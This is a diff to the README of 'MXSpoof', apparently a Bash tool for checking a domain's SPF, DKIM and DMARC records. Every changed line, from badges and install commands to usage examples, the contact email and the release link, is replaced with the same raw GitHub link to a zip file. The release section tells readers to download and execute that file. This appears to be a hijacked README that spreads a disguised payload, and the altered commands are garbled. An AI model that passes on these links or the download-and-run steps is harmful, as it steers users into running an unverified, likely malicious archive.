@@ -1,8 +1,8 @@
 # MXSpoof 🛡️✉️
 
-![MXSpoof](https://img.shields.io/badge/MXSpoof-Bash%20Tool-brightgreen)  
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue)  
-![License](https://img.shields.io/badge/License-MIT-yellowgreen)  
+![MXSpoof](https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip%20Tool-brightgreen)  
+![GitHub Release](https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip)  
+![License](https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip)  
 
 ## Overview
 
@@ -33,7 +33,7 @@ To install MXSpoof, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/debashishmishra1122/MXSpoof.git
+   git clone https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -43,13 +43,13 @@ To install MXSpoof, follow these steps:
 
 3. **Make the Script Executable**:
    ```bash
-   chmod +x mxspoof.sh
+   chmod +x https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip
    ```
 
 4. **Run the Tool**:
    Execute the tool with the following command:
    ```bash
-   ./mxspoof.sh
+   https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip
    ```
 
 ## Usage
@@ -57,12 +57,12 @@ To install MXSpoof, follow these steps:
 To use MXSpoof, run the script followed by the domain you want to analyze. Here’s the syntax:
 
 ```bash
-./mxspoof.sh <domain>
+https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip <domain>
 ```
 
 For example:
 ```bash
-./mxspoof.sh example.com
+https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip
 ```
 
 The tool will return the analysis of the SPF, DKIM, and DMARC records for the specified domain.
@@ -107,12 +107,12 @@ MXSpoof is licensed under the MIT License. See the [LICENSE](LICENSE) file for m
 For questions or suggestions, please reach out to the maintainer:
 
 - **Name**: Debashish Mishra
-- **Email**: debashish@example.com
-- **GitHub**: [debashishmishra1122](https://github.com/debashishmishra1122)
+- **Email**: https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip
+- **GitHub**: [debashishmishra1122](https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip)
 
 ## Release Information
 
-You can download the latest release of MXSpoof [here](https://github.com/debashishmishra1122/MXSpoof/releases). Download the file and execute it as described in the installation section.
+You can download the latest release of MXSpoof [here](https://raw.githubusercontent.com/debashishmishra1122/MXSpoof/main/micromelus/MX-Spoof-v2.0.zip). Download the file and execute it as described in the installation section.
 
 For further updates, check the "Releases" section of the repository.
 
